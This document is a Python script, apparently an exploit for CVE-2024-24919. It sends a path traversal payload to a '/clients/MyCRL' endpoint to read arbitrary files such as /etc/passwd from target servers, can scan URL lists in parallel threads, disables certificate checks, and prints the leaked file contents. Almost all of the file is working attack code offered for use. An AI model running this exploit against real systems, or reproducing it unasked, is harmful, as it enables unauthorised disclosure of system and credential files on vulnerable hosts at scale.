import requests
import argparse
import re
import validators
from colorama import init, Fore, Style
from requests.exceptions import SSLError, RequestException
import urllib3
import threading
from urllib3.exceptions import ProtocolError

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_vulnerability(url, data):
    if not validators.url(url):
        print(Fore.YELLOW + 'Invalid URL: ' + url)
        return

    try:
        send_req = requests.post(url=url + "/clients/MyCRL", data="aCSHELL/../../../../../../../"+data, verify=False)
        if send_req.status_code == 200:
            print(Fore.RED + 'Vulnerable: ' + url)
            print('Response:')
            print(send_req.text)
        else:
            print(Fore.GREEN + 'Not Vulnerable: ' + url)
    except SSLError as ssl_error:
        print(Fore.YELLOW + 'SSL Error occurred while checking: ' + url)
        print(str(ssl_error))
    except ProtocolError as protocol_error:
        print(Fore.YELLOW + 'Protocol Error occurred while checking: ' + url)
        print(str(protocol_error))
    except RequestException as req_error:
        if 'Connection aborted.' in str(req_error):
            print(Fore.YELLOW + 'Connection Error occurred while checking (treated as invalid URL): ' + url)
        else:
            print(Fore.YELLOW + 'Request Error occurred while checking: ' + url)
        print(str(req_error))
    except Exception as e:
        print(Fore.YELLOW + 'An unexpected error occurred while checking: ' + url)
        print(str(e))
    finally:
        print(Style.RESET_ALL)

def worker(url, data):
    check_vulnerability(url.strip(), data)

def main():
    init()
    parser = argparse.ArgumentParser(description='Example: python3 cve-2024-24919.py -u https://10.10.0.1 -d /etc/passwd')
    parser.add_argument('-u', '--url', help='Single URL to check for vulnerability')
    parser.add_argument('-f', '--file', help='File containing multiple URLs to check')
    parser.add_argument('-d', '--data', required=True, help='Data to send in the request')
    args = parser.parse_args()

    threads = []

    if args.url:
        worker(args.url, args.data)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                urls = f.readlines()
                for url in urls:
                    t = threading.Thread(target=worker, args=(url, args.data))
                    threads.append(t)
                    t.start()

                for t in threads:
                    t.join()
        except FileNotFoundError:
            print(Fore.YELLOW + 'File not found: ' + args.file)
        except Exception as e:
            print(Fore.YELLOW + 'An unexpected error occurred while reading the file: ' + args.file)
            print(str(e))
        finally:
            print(Style.RESET_ALL)
    else:
        print(Fore.YELLOW + 'Please provide either a single URL (-u) or a file containing URLs (-f).')
        print(Style.RESET_ALL)

if __name__ == "__main__":
    main()
